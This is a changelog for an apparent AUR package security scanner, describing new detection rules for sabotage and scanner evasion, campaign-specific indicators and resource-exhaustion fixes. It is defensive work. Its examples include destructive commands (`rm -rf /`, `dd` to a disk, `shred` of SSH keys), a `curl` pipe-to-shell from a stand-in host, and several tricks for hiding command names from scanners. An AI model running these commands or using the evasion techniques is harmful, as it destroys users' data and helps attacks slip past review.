# Changelog

## [0.13.2] - 2026-08-15

### Added

- **A crossfire rule family (X001-X007): the evasion technique, not the
  payload.** Every other family fires on what a diff does; these fire on how it
  was written. The reason is where detection actually failed - the payload rules
  held, and the tokenizer feeding them did not. Partial quoting (`c"u"rl`),
  array routing (`${A[0]}`), namerefs and command substitution each assemble an
  executable name that no pattern over the resolved text ever sees, because
  resolution is the step that broke.

  The failure mode inverts: a defeated tokenizer used to produce silence, which
  is the worst available output - the analysis reads clean exactly when it
  understood least. It now produces a CRITICAL finding, so the bypass and the
  alarm are the same event.

    - `X001` encoded payload decoded to a shell (CRITICAL), `X002` non-literal
      executable name (CRITICAL), `X003` obfuscated command argument (HIGH),
      `X004` build output suppressed (MEDIUM), `X005` write into the operator's
      home (HIGH), `X006` source points somewhere unexpected (HIGH), `X007` two
      or more techniques in one diff (CRITICAL).
    - **Measured before weighted.** Against the 3,739-diff locked benign
      corpus: X001, X003, X004, X005, X006 and X007 fire on **zero** diffs;
      X002 on 26 (0.695%). The ceiling is 30%, so these sit well under it,
      which is what makes CRITICAL affordable - legitimate recipes do not
      assemble command names out of parts. Hardening X002 against evasion
      raised its rate from 0.374%, and two further exclusions (an expression
      context is not a command; a leading flag means a continuation line)
      brought it back down from 1.097%.
    - **The anti-evasion rules were themselves attacked, and lost twelve
      times before they held.** A family whose purpose is detecting evasion is
      the one place where "can the rule be evaded" is not rhetorical. X002 fell
      to nine variants that displace the command word - an assignment prefix
      (`FOO=1 ${A[0]}`), a wrapper (`env`, `exec`, `sudo`, `nohup`,
      `timeout 5`), a leading redirect (`>out ${A[0]}`) and a subshell
      (`( ${A[0]} )`) - because it read the first token rather than walking
      past prefixes. X001 fell to `| /bin/sh` and `| env sh`; X005 to
      `/home//alice` and an assignment prefix. All are closed and pinned as
      regressions in `tests/test_crossfire.py` (47 tests), alongside a bounded
      matching check: no pattern may be made to backtrack on an 8 KiB hostile
      line, which is the failure a sabotage rule already produced once.
    - **X002's exclusions were derived from the corpus, not guessed.** An
      assignment names no executable (`font=$(grep ...)`); a variable the
      tokenizer reduced to a literal is a spelling choice, not an evasion; and
      quotes and parentheses bound the command split, because a `|` inside
      `sed 's|a|b|'` and an `&&` inside `(( a && b ))` are not command
      separators. Each of those produced false positives before it was handled.
    - **Two candidates were dropped for overlap rather than difficulty.**
      Base64-to-shell is R003/R043 at CRITICAL; bidi and homoglyphs are R013 at
      FATAL plus R013b. X001 ships as the *remainder* of the first. There is no
      X008: the bidi rule leaves nothing for it to do, and scoring the same
      characters twice would corrupt the calibration.
    - **X005 became a rule about the spelling, not the write.** R077 already
      claims a target starting with `~/` or `$HOME/`, so a second rule beside
      it scored one line twice. But R077 matches only that prefix, and the same
      directory is reachable as `/home/alice/...`, `/home/$USER/...`,
      `~alice/...`, `/root/...`, `${HOME:-/home/alice}/...`, or by traversing
      into it - none of which it sees. X005 now owns exactly those, defers to
      R077 on the plain spelling, and exempts `$pkgdir` staging. It fires on
      zero benign diffs.
    - **R077 is CRITICAL inside an install scriptlet.** pacman runs scriptlets
      as root during the transaction, so a write into a user's home from one is
      categorical rather than suspicious. The same write during `build()` stays
      HIGH.
    - **Two more were dropped on measurement.** Bare `2>/dev/null` fires on
      0.481% of benign diffs as ordinary defensive shell, so X004 excludes it.
      Domain reputation and upstream-owner matching are absent from X006
      because the novelty tier already scores a globally-first-seen URL.

- The `crossfire` category, previously reserved for cross-package comparison
  and shipping nothing, now carries this family. `R143` moved to
  `maintainer-and-metadata`, where `R141` already lives: it had been filed under
  `crossfire` by mistake, which left the generated index simultaneously listing
  it and stating that crossfire ships nothing. `COMPOSITION` was not an option
  either - its rules are weight-0 annotations and R143 scores 25.

- **A sabotage rule family (S001-S008).** Every other family describes a
  supply-chain compromise - code fetched, credentials sent, persistence
  installed - and all of them assume the attacker wants something *out* of the
  machine, so there is a fetch or an egress to notice. A sabotage payload
  wants nothing out: it runs, and the machine is worse off.

  Measured before these rules existed, all of the following scored **0/100**
  in `build()`: a classic fork bomb, `rm -rf / --no-preserve-root`,
  `dd if=/dev/zero of=/dev/sda`, `mkfs.ext4 /dev/sda1`,
  `shred -u ~/.ssh/id_rsa`, `chmod -R 777 /`, an `xmrig` invocation, and
  `history -c`. A `curl | bash` on the same line scored 65, which is the shape
  of the gap: excellent at supply-chain compromise, blind to sabotage. It was
  not a documented limit either.

    - `S001` recursive self-spawn (CRITICAL), `S002` recursive deletion
      outside the build tree (CRITICAL), `S003` raw block device write
      (CRITICAL), `S004` secure deletion of user data (HIGH), `S005`
      permission change on a system path (HIGH), `S006` system service
      disruption (HIGH), `S007` cryptocurrency miner (HIGH), `S008` shell
      history or log destruction (MEDIUM).
    - Named **sabotage**, not destruction: exhausting the CPU, stopping the
      services a machine exists to run, and mining someone else's coin all
      destroy nothing, and a family called destructive would have had no home
      for them.
    - Three distinctions carry the calibration, because none of these commands
      is rare in a PKGBUILD. The build sandbox is not the system (`rm -rf
      "$srcdir/build"` is housekeeping). A mention is not an invocation
      (`echo "never run rm -rf /"` is a recipe being helpful, so every command
      name is anchored to command position). A package's own service is not the
      system's (`systemctl disable input-remapper` on removal is standard
      packaging, so only system units count).
    - Every rule fires on **zero** of the 3,739 diffs in the locked benign
      corpus.

- **AUR dependency depth.** An AUR package's `depends` and `makedepends` can
  name other AUR packages, and `makepkg` builds those on your machine in the
  same run - so a review that read only the package you typed was reading one
  recipe out of several that would execute. This is the June 2026 campaign's
  relevance: an orphan is far more often somebody's dependency than the thing
  they meant to install.

  `[depth] levels` in config and `--depth` per run: `0` disables it, `1` (the
  default, for both `review` and `inspect`) analyses direct AUR dependencies,
  `n` analyses `n` levels, `-1` walks every level there is.

    - **Each dependency is analysed as a package**, not as a component of
      one: its own score, its own band, its own coverage gaps, its own row in
      the database. Nothing is folded into the parent's score. That is
      load-bearing rather than fastidious - `depth` is deliberately absent
      from the config fingerprint, so a parent score that moved with
      `--depth` would break B1 for every operator comparing two runs.
    - **`-1` is bounded, and has to be.** The dependency graph is written by
      the party under review: a recipe declaring five hundred AUR
      `makedepends`, each declaring five hundred more, would otherwise decide
      how many repositories this machine clones - the A14 breach that Part D
      lists as a vulnerability. The ceilings are `depth.MAX_DEPTH_LEVELS` (8)
      and `depth.MAX_DEPTH_NODES` (200 per run), both source constants.
    - **New `deps_not_scanned` coverage gap**, recorded when the walk stopped
      early: a ceiling cut it short, or a dependency could not be analysed. A
      walk that *completed* is not a gap - asking for depth 1 and getting
      depth 1 answers the question that was asked, and calling that
      incomplete would make every default run report a gap and teach readers
      to ignore it.
    - The walk is cycle-safe, and one dependency is analysed once per run
      even when twenty installed packages share it.
    - **On the corpus path** (`full-aur`) the walk reads results the cycle has
      already computed - the stored package profile first, the stored PKGBUILD
      snapshot as a fallback - instead of re-running the pipeline for a package
      that is analysed as a root anyway. Its visited set is deliberately *not*
      shared between corpus packages: every package is a root there, so a
      shared set would hand each dependency to whichever parent ran first and
      leave every other parent reporting an empty closure, which reads as "this
      package has no AUR dependencies".
    - Dependency metadata comes from the corpus snapshot when one exists (no
      network at all), otherwise one batched AUR RPC request per level.
      `optdepends` is out of scope - it is not installed by default.
    - **Mini-cards.** Each dependency renders as its own card nested inside
      the package's card, indented by level, on all four terminal surfaces,
      and as a `dependencies` array on all three JSON surfaces. The
      `every render reports the same information` gate was extended to cover
      them, so a dependency shown in one surface cannot be missing from
      another.

- **Detection for the June 2026 AUR campaign ("Atomic Arch",
  Sonatype-2026-003775).** The campaign hijacked ~1,500 orphaned packages,
  left the upstream source untouched, and added npm build dependencies whose
  install step ran a credential-harvesting binary during `makepkg`.

  Measured before this change, on a database with a normal corpus, that diff
  scored **15/100 - UNFLAGGED**. The 65 an empty database produced was an
  artifact: 50 of those points were D001 "this dependency has never been seen
  in the AUR", which goes silent once the corpus knows `npm` and `nodejs`. The
  better the corpus, the lower the attack scored. It now scores **70/100,
  High**.

  Four pieces, and only the first is a security invariant:

    - **`unpinned_build_deps` coverage gap (B2, A14).** `makepkg` verifies
      `source=()` against `sha256sums` and verifies nothing a build step
      resolves from a registry, so when `prepare()` runs `npm install foo` the
      code that will execute is not in the analysed text. That is a missing
      sensor, so it is reported as one: the gap forbids UNFLAGGED and
      qualifies the band. Deliberately **not** a scored rule - `npm install`
      in a build function is ordinary AUR practice, which is exactly why R081
      is scoped to install hooks and a calibration gate keeps it there, and
      why the attack looked normal. Fires on 0.3% of the locked benign corpus.
    - **R141 (adopted from orphan, MEDIUM).** The campaign's entry point.
      R092/R093/R107/R111/R126 all describe adoption and all need a
      `full-aur` cycle, so `trustsight review` users - the people actually
      hit - had no adoption signal at all. R141 uses the AUR `Maintainer`
      field the review path already fetches and threw away. Orphan state is
      persisted tri-state (orphaned / maintained / never asked), and an
      unavailable RPC records unknown rather than guessing either way.
    - **R142 (recipe changed without upstream, MEDIUM).** A dependency array
      **and** a build function both moved while `source=`, every `*sums=` and
      `pkgver` did not. The conjunction is measured, not assumed: on the
      3,739-diff benign corpus `deps or build` fires on 11.53% and
      `deps and build` on **1.42%** - eight times less noise for no lost
      detection, since the campaign changed both. It also keeps R142 off
      R060's territory, which is INFO precisely because "build function
      modified" fires on 21.4% of benign diffs.
    - **R143 (the composition, HIGH).** R141, R142 and a registry resolution
      together. Each member is ordinary alone and cheap by design; scoring
      the conjunction is what clears the flag threshold without any single
      rule spending fire rate it does not have.

- **An IOC surface for names a build step installs.** A `package` indicator
  reached the AUR package name, `pkgbase` and the dependency arrays. The
  campaign named its payload in none of those - `atomic-lockfile` appeared
  only as an argument to `npm install` inside `prepare()` - so a curator's
  list naming it would have matched nothing. Matches now carry the
  `build_install` surface.

- **`data/iocs/atomic-arch-2026-06.json`**, three `package` indicators
  (`atomic-lockfile`, `lockfile-js`, `js-digest`) with `Sonatype-2026-003775`
  provenance, built to an unsigned baseline in `ioc-baselines/`. Narrowest
  indicator per the curation policy: the `deps` binary name is deliberately
  **excluded** as far too generic without a hash, and no domains or hashes
  were invented.

### Security

- **Two render paths sanitised untrusted text with the weaker helper.**
  `safe_text` is explicit that the boundary is where a value is *rendered*,
  so stored evidence and JSON stay byte-exact. Two paths used
  `unicode.strip_ansi` instead, which removes CSI sequences and leaves C1
  control bytes, BEL and newlines behind. `\x9b2J` is the 8-bit spelling of
  "clear the screen", so an attacker-derived finding reason could repaint
  the terminal, which is precisely the forgery `safe_text` was written to
  prevent. Both spellings look like sanitising at a glance, which is why
  this survived review.

- **Federated IOC values were passed to Rich as bare strings.** `ioc.py`
  did not import `clean` at all and rendered the indicator value, its
  source and its confidence directly. Rich parses a bare `str` as markup,
  so an entry containing `[/]` raises `MarkupError` and **aborts the whole
  table**: one hostile indicator in an imported baseline made `ioc list`
  unusable rather than merely ugly. IOC federation means third parties
  supply these fields by design. Values are now `clean`ed and wrapped in
  `Text`.

  A new `untrusted text is sanitised where it is rendered` gate checks both
  properties across every CLI module, on calls and imports rather than on
  the substring so that a comment explaining the rule does not trip it.


- **Three rule patterns did not exist until match time, and nothing audited
  them.** R013, R047 and R048 carry a placeholder in the TOML and are
  assembled when `apply_rules` runs: R013 from Unicode data, R047 and R048
  from operator config. That made them invisible to all three of the
  audit's collection strategies at once, since they are not a TOML literal,
  not a `re.compile("literal")` in the source, and not a module-level
  `re.Pattern`. R013 is the **FATAL** homoglyph rule, and because R047/R048
  are derived from config, a config edit could have introduced a slow
  pattern with no gate positioned to notice.

  Generation moved into `rules.resolve_generated_patterns`, which
  `apply_rules` and the audit both call, so the audit checks the pattern
  that actually executes rather than the placeholder. Auditing a
  placeholder is worse than not auditing: it reports coverage it does not
  have. All three measured fast and needed no change.

- **The regex audit was blind to 18% of the patterns it was meant to cover.**
  It collected patterns by walking the AST for `re.compile("literal")`, so
  a pattern assembled from parts, `re.compile(_WRITE_CMD_START + r"tee ...")`,
  is a `BinOp` rather than a `Constant` and was skipped in silence. That was
  **44 of 246 patterns**, concentrated in `sabotage` (11), `persistence` (6)
  and `crossfire` (4): the modules built from shared command-start prefixes,
  where one bad component would have spread across many rules unchecked.

  The audit now also enumerates every compiled pattern reachable from an
  imported module, which is the only way to see a pattern whose text does
  not exist until it is built. Coverage went from 233 to 255 distinct
  patterns, deduplicated by pattern text so the count means something, and
  the audit applies the same growth check `rules._compiled` does.

  A new `every live regex is audited` gate asserts the *coverage* rather
  than the verdict, because a gate that passes because it never looked is
  the failure this codebase keeps finding. All three previously unaudited
  patterns that exceeded 10 ms on a full line were measured and are linear,
  a large constant rather than a complexity bug, so nothing needed fixing
  once they were finally visible.

- **Three shipped patterns were quadratic, and the probes could not see it.**
  `BACKTRACK_REPS` is 22, which is tuned for *exponential* backtracking:
  2^22 is millions of steps and shows instantly. Polynomial cost is
  invisible there - 22 squared is 484 steps - while rules run against lines
  up to `rules.MAX_RULE_LINE_BYTES` (8192), where the same pattern costs 67
  million. Every one of these passed the short probes and the CI audit:

  | Pattern | Cost on one 8 KiB line | After |
  |---|---|---|
  | `novelty._VERSION_RE`, `\d+(?:\.\d+){1,}` | 3215 ms | 2.2 ms |
  | `build._SUDO_CMD_START_RE`, two adjacent `\s*` | 1113 ms | 0.6 ms |
  | `novelty._TRAILING_RE`, `/+$` | 596 ms | replaced with `rstrip` |
  | `sabotage._FORK_BOMB_DEF_RE` | 20 ms | 5.7 ms |

  A 5 MiB diff of full-length lines is ~640 lines, so the version matcher
  alone was about **36 minutes of CPU** for one package - under every cap
  added this release. Aggregate worst case across all patterns fell from
  4870 ms to 143 ms. The fixes are bounded repetition (`\d{1,32}`),
  possessive quantifiers, collapsing an ambiguous `\s*\s*` pair, and one
  regex deleted in favour of `str.rstrip`; behaviour is unchanged in every
  case, checked against the shapes each rule exists to match.

  The detector now probes at `LONG_PROBE_LEN` (2048) as well as 22, and
  measures **growth** rather than only absolute time: four times the input
  costs about four times the time when a pattern is linear and sixteen when
  it is quadratic, so `SUPERLINEAR_GROWTH` separates them. Absolute time
  alone was not enough - the `sudo` pattern is quadratic with a small
  constant and sat under the budget at the probe length while still costing
  seconds at a full line. `lint` reports the growth case with its own
  message, because "cheap on a short line, expensive on a long one" is not
  what a rule author reads "exponential" to mean.

  Two patterns previously documented here as linear - `(-?\d+,)+;` and
  `(a|ab)+c` - are quadratic (15.4x and 14.8x growth for 4x input). They
  were classified from measurements at n<=26, which is exactly the blind
  spot being closed. Prefix-overlap alternation is refused again, now on
  measurement rather than on a structural guess.

- **The one runtime-built pattern is now audited like a shipped one.**
  `scripts/regex_audit.py` reads source, so it covers every `re.compile` in
  the tree - except the pattern `find_line_in_diff` assembles from its
  argument. That function took regex syntax, compiled it **unescaped
  first**, and fell back to escaping only on `re.error`, so any argument
  that was *valid* regex ran as one against every line of the diff, with no
  backtracking check anywhere on the path. A supplied `(a+)+$` cost **5.6
  seconds against a single 24-character line**, doubling every two
  characters after that.

  All twelve call sites pass either an intentional pattern or an escaped
  fragment, so nothing was exploitable today; the exposure was that
  forwarding package text once would have been enough. A dynamic pattern is
  now held to the same standard as a shipped one, and a refused pattern is
  matched as the literal text it probably was rather than dropped - 5.6s
  becomes 0.000s and the intentional patterns still work.

  Two copies of the function existed, in `analysis/delivery.py` and
  `analysis/structural.py`. They are one shared helper in `rules.py` (which
  already owns the regex-safety import), with a test asserting no local copy
  returns, because identical code in two modules is how a fix lands in one
  of them.

- **A URL is sliced before it is escaped, not after (C005).** Cutting an
  escaped string can cut an escape sequence in half; the compile then fails,
  the fallback escapes the already-escaped text, and the line number is
  silently lost - on exactly the long URLs the rule is reporting.

- **The backtracking detector is probed with the pattern's own alphabet.**
  `regex_safety` decides whether a pattern may run against hostile text, so
  its sensitivity is the security property. It ran six fixed probes made of
  `a`, spaces, `/` and `|` - **no digit appeared in any of them**, so every
  pattern driven by `\d` or `[0-9]` was tested with input it could not
  match and scored a risk of exactly 0.0s, which reads identically to safe.
  Of ten known-catastrophic patterns, five passed.

  Probes are now derived from each pattern's own classes and literals, which
  generalises instead of extending a list of the attacks somebody thought
  of. Two fixed probes were added for shapes the derivation does not reach:
  a digit run, and a dotted name with no scheme - `https://a.a.a.com` cannot
  reach a `^`-anchored host pattern, because it fails at position 0 before
  any backtracking starts, and host-shaped patterns are everywhere here. The
  structural check also now catches a quantified character class inside a
  quantified group (`([0-9]+)+`) and identical alternation branches
  (`(x|x)*`). All ten are refused; 233 shipped patterns and 11 TOML rule
  patterns still compile, and probing a safe pattern costs 0.027 ms.

  Prefix-overlap alternation (`(a|ab)+`) is deliberately **not** refused.
  The textbook calls it ambiguous, but measured in CPython it is flat under
  both attack shapes, and a refused pattern does not raise - `_compiled`
  returns None and the rule quietly stops matching. A false refusal is a
  hole, not an inconvenience, so the check stays where the evidence is.

- **A line-count cap on rule matching (`rules.MAX_SCANNED_LINES`).**
  `MAX_RULE_LINE_BYTES` bounded how *long* a line may be and nothing bounded
  how *many* there are, but matching costs per line - about 0.46 ms - so the
  5 MiB byte cap permitted ~1.3 million short lines and roughly **ten minutes
  of CPU** for one package, times `depth.MAX_DEPTH_NODES` (200) at full
  depth. A 200,000-line diff now takes 8.9s instead of 92s.

  The cap is 20,000: five times the largest diff in the 3,739-diff locked
  benign corpus (3,839 lines; p99.9 is 2,117), so it truncates none of them.
  Truncating reports a new `scan_truncated` coverage gap and sets the
  matching `scan_truncated` field on the report, kept distinct from
  `diff_truncated` because they name different dials - a reader who saw only
  the byte gap would raise `[diff] max_diff_bytes` and find it changed
  nothing.

  `analyze_package` and `scan_diff` are parallel implementations that each
  tokenize and each match, so the clamp is one shared helper rather than two
  copies, and a test walks the AST to assert nothing tokenizes an unclamped
  diff. The byte cap beside it was originally written on the git path alone,
  which is the same mistake one step earlier.

- **Resource bounds derived from the resource, not from the wire format.**
  A14 says no package-controlled input decides how much CPU, memory, network
  or disk this process uses. Five places bounded an input without bounding
  what the input became, and each looked adequate on its own:

    - `MAX_DECOMPRESSED_BYTES` was set against the ~250 MB AUR dump on the
      wire. Measured with `tracemalloc`, dump-shaped JSON parses into Python
      objects at about **6x** its serialised size, so the 1 GiB ceiling
      permitted ~6.1 GiB of live objects. Lowered to 512 MiB, with the
      measured factor recorded as `JSON_OBJECT_AMPLIFICATION` so the ceiling
      can be re-derived rather than guessed at.
    - The IOC baseline loader capped bytes (`MAX_BASELINE_BYTES`, 256 MiB)
      and not entries, so a baseline was millions of `IocEntry` objects.
      Added `MAX_BASELINE_ENTRIES`.
    - Clones and fetches were bounded by a 120-second deadline and nothing
      else. A deadline is not a byte budget: on a fast link it is gigabytes
      written straight to the cache. Added `MAX_TRANSFER_BYTES` (256 MiB) via
      the existing progress callback.
    - A per-repository ceiling is not a disk bound, because the dependency
      walk multiplies it by `depth.MAX_DEPTH_NODES` (200) - two caps that
      each look sufficient compose to their product, 50 GiB. Added
      `MAX_TOTAL_TRANSFER_BYTES` (2 GiB), charged across the whole run.
    - Repository history is authored by the party under review, and three
      walks ran it to exhaustion - one of them decoding a PKGBUILD blob per
      commit. Added `MAX_HISTORY_COMMITS` and `fetcher.walk_bounded`, a
      single implementation the fourth walk (`temporal`, which had its own
      inline counter) now shares. A test asserts no raw `repo.walk` survives
      outside it, because "a control applied at one of several equivalent
      call sites" is the recurring failure this codebase has.

  An oversized transfer raises a `_TimeoutError` subclass deliberately:
  every call site already treats that as "this fetch did not complete", and
  a new exception type would be a second path for one of them to forget.
  There is no GPU bound because there is no accelerator code - nothing in
  the tree imports CUDA, PyTorch, OpenCL or NumPy.

- **A crafted `source=` URL could cost half an hour of CPU.** URL
  classification walked every hostname label and computed every parent
  domain, which is quadratic in label count. One 8 KiB host made of dots took
  421 ms, and `MAX_URLS_PER_SIDE` allows 4,096 URLs per side, so a single
  package could spend roughly 29 minutes in classification alone - A14 says no
  package-controlled input decides how much CPU this process uses.

  Bounded by DNS's own limits, `MAX_HOST_BYTES` (253) and `MAX_HOST_LABELS`
  (127): nothing past those is a hostname anyone can resolve. A full cap of
  4,096 hostile URLs went from **163 s to 2.7 s, a 60x improvement**.

  Labels are dropped from the **left**, not the right. The first version of
  this fix truncated the leading 253 bytes and discarded the registrable
  domain - the part every classification decision reads - which a test caught.
  And truncating rather than refusing is deliberate: refusing an over-length
  host outright would let an attacker pad a homograph domain past the check,
  so padding a known homograph with 5,000 labels is asserted to classify
  exactly as the bare host does.

- **`.SRCINFO` parsing was quadratic.** `parse_srcinfo` tested membership with
  `value not in result[key]` - a linear scan of a growing list, once per line.
  With every value under one key, which is what a `depends` array is, that is
  O(n^2): a 200,000-entry file took **561 seconds**. Membership now uses a set
  beside the list, so order and de-duplication are unchanged: **256 ms**, a
  2,195x improvement. `diff_srcinfo` had the same shape in its added/removed
  comprehensions and is now linear too, and the blob read is size-checked
  before `.data`.

  Three bounds were added, matching what the differ applies to a patch:
  `MAX_SRCINFO_BYTES`, `MAX_SRCINFO_LINES`, `MAX_SRCINFO_VALUES_PER_KEY`.

  **This module is not currently imported by production code**, so the defect
  was latent rather than exploitable - the live `.SRCINFO` consumer,
  `full_aur.properties.extract_properties`, already used sets. It is fixed
  rather than left because dead code that gets wired up later is exactly how a
  nine-minute parse reaches a user.

- **The A5 hostile-input gate measured only one of two shapes.** It timed a
  single 5 MiB *line*, which the 8 KiB clamp makes cheap. The same byte budget
  spread over many *lines* pays the whole ruleset per line and costs far more -
  the gate now measures both, and reports each separately.

- **A command name split across a line continuation was invisible to every
  rule.** Both continuation joiners inserted a space, so `cur\` followed by
  `l https://...` became `cur l https://...` - two words, and nothing that
  matches a command name saw either. The shell *removes* a backslash-newline;
  it is not whitespace. `curl https://evil.example/x | sh` written that way
  scored 20 (the source-domain prior alone) and now scores 65.

  There were **two joiners** - `join_line_continuations` and the indexed form
  the rule path uses - and fixing the first left the second reachable, which
  is the "control applied at one of several equivalent call sites" failure
  `contributing/security-review.md` catalogues. Both now join verbatim, and
  indentation on the continuation line still separates arguments.

- **Two more shapes for X002**, found by wrapping one payload sixteen ways:
  brace expansion assembling a name (`cur{l,}`) and a character that
  impersonates ASCII (`сurl`, Cyrillic). Both scored 20 before and score 60
  now.

  The homoglyph shape uses the curated confusable map `buckets` already
  applies to domains, not "any non-ASCII character": the broader form raised
  X002's benign rate from 0.695% to 0.802% by firing on ordinary English prose
  carrying a typographic apostrophe, which impersonates nothing. Narrowing it
  returned the rate to 0.695% with the detection kept.

- **Esoteric-input sweep.** Thirty-seven shapes - heredocs (quoted, unquoted,
  dash), here-strings, process substitution, brace ranges, parameter
  operators, array slices, `case`, CRLF, missing trailing newline, NUL bytes,
  BOM, astral planes, combining marks, NFD, lone-surrogate escapes, malformed
  and negative hunk headers - produced **zero crashes and zero
  nondeterminism**. Sixteen carrying a live payload are now pinned as
  regressions: none may score on the source prior alone.

- **B2's calibration table was stale in six of eight figures.** Verified by
  recomputing every one against the locked corpus with the same code path the
  calibration gate uses: corpus size 3,246 -> 3,739, benign p95 45 -> 35,
  zero-rate 69.1% -> 68.3%, benign above threshold 16.3% -> 13.1%, the
  percentile 20 sits at 83.7th -> 86.9th, and the separation margin 15 -> 25.
  Median (0), malicious p5 (60) and malicious minimum (40) were correct.

  Every drift is in the safe direction - the tool flags fewer benign updates
  than documented and separates the populations more widely - but the doc's
  own promise is that a published number is measured, so "better than stated"
  is still stated wrongly. The prose said a reviewer should expect to look at
  roughly one benign update in six; it is now closer to one in eight.

- **The coverage-gap count said seven where eight are listed.** An off-by-one
  introduced with `deps_not_scanned`; the table itself was complete.

- **The diff generator's byte cap was inert on the path that uses it.** The git
  path called `generate_diff` with no `max_bytes`, so the internal capping
  block was skipped entirely: every filtered patch was materialised in full via
  `patch.text`, joined into one string, and only then truncated to 5 MiB. A
  repository with one 2 GB `.install` diff allocated 2 GB before any bound
  applied. `MAX_GENERATED_DIFF_BYTES` existed and did nothing on that path, and
  A4's own wording hedged it - "capped ... *when the git path requests a
  limit*", which it did not.

  The bound that matters now runs *before* `patch.text`. That attribute has
  already allocated the whole patch by the time it returns, so a cap applied
  afterwards bounds retention rather than memory - the same distinction this
  release draws for tar members and blobs, and one the first version of this
  fix got wrong. A delta whose declared file size on either side exceeds
  `MAX_PATCH_SOURCE_BYTES` is now skipped without its text being requested,
  which is the only bound available ahead of the allocation; a patch is at
  most the changed lines plus context, so a file small on both sides cannot
  yield a large one. Text that is read is capped at `MAX_PATCH_BYTES`, the
  retained total at `MAX_GENERATED_DIFF_BYTES`, patches visited at
  `MAX_DIFF_PATCHES`, and the summary at `MAX_DIFF_SUMMARY_FILES` - the
  summary walked every delta regardless of the text cap, so a wide repository
  chose the size of a stored `fact_json`.

  What none of this covers is libgit2's own diff construction: `repo.diff()`
  builds the diff before any of it runs, and that cost is a property of the
  repository. It sits inside the stated dependency assumption and is now
  documented rather than implied.

- **Generator-side truncation is returned, not inferred.** This is the pairing
  that matters, and fixing the bound without it would have created the defect
  it prevents: a patch the generator declines to retain leaves the assembled
  text at or under the cap, so a caller measuring that text reports a complete
  analysis while content was skipped. That is the silent skip B2 forbids and
  Part D lists as in scope. `generate_diff_bounded` returns the flag and the
  pipeline consumes it; the two-value `generate_diff` remains for existing
  callers.

  Policy omission stays distinct from truncation: a `.png` the filter never
  reads leaves nothing unexamined, while a `.install` dropped at a cap does,
  and only the second sets the flag.

- **The PKGBUILD blob driving companion discovery was read unbounded.**
  `blob.data` materialises everything, and the size check came afterwards - so
  the one blob guaranteed to exist was the one read without a bound, while the
  companion blobs beside it were checked first. Now bounded by
  `MAX_PKG_BUILD_BYTES` before `.data` is touched, with a test that proves the
  ordering behaviourally rather than by reading the source.

- **Companion discovery walked the whole tree.** `MAX_COMPANION_FILES` applies
  to the *selected* set, so the walk producing that set was unbounded; it now
  stops at `MAX_COMPANION_TREE_ENTRIES`. A referenced basename past
  `MAX_COMPANION_NAME_BYTES`, or carrying any path structure (absolute,
  traversal, separators, NUL), is refused rather than rendered into a hunk
  header naming a file the reader cannot open.

- Two new gates: `generated diff is bounded before assembly` and
  `companion reads are bounded before data`.

- **A snapshot member was read with no bound.** `MAX_RESPONSE_BYTES` caps the
  *compressed* snapshot body at 32 MiB, and `_pkgbuild_from_tarfile` then read
  the PKGBUILD member with a bare `read()`. A tar member's declared size is
  the attacker's number, and gzip on compressible content runs to roughly a
  thousand to one, so a tarball comfortably inside the response cap could
  declare - and cause the process to allocate - tens of gigabytes. Member
  reads are now bounded by `full_aur.fetch.MAX_TAR_MEMBER_BYTES` as the bytes
  are materialised.

- **Artifact reads happened before the checks that were supposed to bound
  them.** An Ed25519 signature is computed over the bytes of the thing it
  signs, so verification cannot run until those bytes are read: a bound
  behind the check guards nothing. The same applied to a digest recorded for
  attribution (A12) and to `gunzip_capped`, which capped an expansion it only
  ever saw as an already-materialised buffer. `ioc_baseline`, `full_aur.export`,
  `db` and `seed_build` now bound every such read before it happens.

- **New `trustsight.bounded_io`.** `read_capped` and `read_file_capped`, both
  refusing rather than truncating. A truncated read is a complete-looking one
  with its tail quietly removed, which is the seam A5 and A6 already refuse.

- **A refused snapshot is a coverage gap, not a silent fallback.** A refused
  archive and a package with no snapshot both fall back to the cgit text
  fetch, so on the fallback alone they are indistinguishable. The new
  `snapshot_refused` gap records that a bound in this program dropped
  content, travelling alongside `tree_not_analyzed`, which only says the tree
  was not read. A14 requires a bound that drops content to be visible as a
  bound.

- **Two new gates, both structural.** `every stream read is bounded` scans the
  whole source for a zero-argument `read()`; it caught a site
  (`seed_build._read_raw_maintainers`) that a targeted audit had missed, which
  is the case for scoping wide. `artifact reads are bounded before
  verification` enumerates the artifact-loading modules.

- **`no path-based archive extraction`**, renamed from `archives are never
  extracted to disk`. The old name was broader than both the check and the
  truth: `db._extract_v2_archive` does write seed members to disk, under an
  explicit containment guard. A8 now states that plainly, names the guards,
  and points at A12 as the actual trust anchor, instead of implying an
  extraction surface that does not exist.

### Changed

- **The complete hardening pass is covered by 2,473 tests, 65 security gates, and 10 calibration gates.** The standalone calibration runner now loads the repository source tree explicitly, so it cannot accidentally validate an older installed TrustSight package instead of the checkout under review.

- **Documentation moved to `docs.trustsight.org`.** 32 links across `README.md`
  and the site configuration (`site_url`, `canonical_host`, `public_base_url`,
  and the Open Graph image) now point at the new domain.

- **Performance: a large diff scans 31% faster, and CLI startup drops ~180 ms.**
  Profiled rather than guessed at, and every change is behaviour-preserving.

    - `deps._strip_comment` was called about **thirty times per diff line** -
      each rule module stripped comments independently - and is a pure
      function of a short string. Memoised with a bounded cache, because the
      keys are attacker-controlled and an unbounded memo is memory the
      attacker sizes.
    - Three modules (`buildfetch`, `sabotage`, `crossfire`) each carried their
      own char-by-char copy of the same stripper, which accounted for most of
      1.77 million list appends in one scan. All three now use the shared
      memoised one.
    - `registry_resolutions` ran **three times per analysis** - once for the
      coverage gap, once for the IOC surface, once for the R143 composition -
      re-joining every line and re-classifying every function each time. Now
      cached, also bounded.
    - `unicode.py` walked all **1,114,112 code points** at import asking
      `unicodedata` for each category, about 360 ms, paid by every CLI
      invocation including `--version`, because `cli.inspect` imports from it
      at module level. The scan is deferred to first use rather than replaced
      by a literal: deriving it is what makes a format-control codepoint added
      in a future Unicode version covered automatically, and only *when* it
      runs has changed.

  Measured on an 875 KB diff: 27.25s -> 18.81s. Scaling stays linear. Routine
  operations were swept and none exceeds 26 ms: config load 2.7 ms, rule load
  0.7 ms, fingerprint 2.5 ms, database init 15.2 ms, a typical package scan
  25.4 ms.

- **A CRITICAL finding floors the band at `High`.** CRITICAL weighs 40 and the
  High band opens at 51, so arithmetic alone could never lift a *single*
  CRITICAL above `Medium`: a lone fork bomb, a lone `rm -rf /` and a lone
  `curl | bash` all total 40, and `curl | bash` only read High because it
  happens to trip three rules at once. One confirmed CRITICAL finding is not a
  medium situation whatever the sum says.

  No score changes - the floor moves the band only - so the calibrated
  separation between the benign and malicious score populations is untouched
